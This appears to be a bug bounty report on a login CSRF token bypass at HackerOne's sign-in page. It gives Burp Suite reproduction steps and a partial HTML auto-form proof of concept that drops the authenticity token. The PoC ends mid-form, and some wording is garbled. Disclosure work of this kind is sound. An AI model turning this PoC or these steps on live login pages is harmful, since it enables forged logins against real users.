## Vulnerability Information
###Summary
Hi. We found a CSRF token bypass on the Hacker One login page.
So, this report describes Hacker One login CSRF Token Bypass.

###Exploitation process
Hacker One uses the authenticity_token token during login to prevent CSRF.
However, the authenticity_token token is not properly verified, so an attacker can log in via CSRF without the authenticity_token token.
In other words, Hacker One thinks that it implemented CSRF token through authenticity_token token, but it is not.

###Steps To Reproduce
1. Go to `https://hackerone.com/users/sign_in`
2. While logging into your account, grab packets through the buff suit.
3. Take the HTML code format from burp suite -> Engagement Tools -> Generate CSRF POC.
4. Delete the authenticity token.
5. Forward the request and CSRF exploited successfully and the modified data changed successfully :)

###PoC
```javascript
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://hackerone.com/users/sign_in" method="POST">

      <input type="hidden" name="user[password]" value="yourpassword" />

      <input type="submit" value="Submit request" />
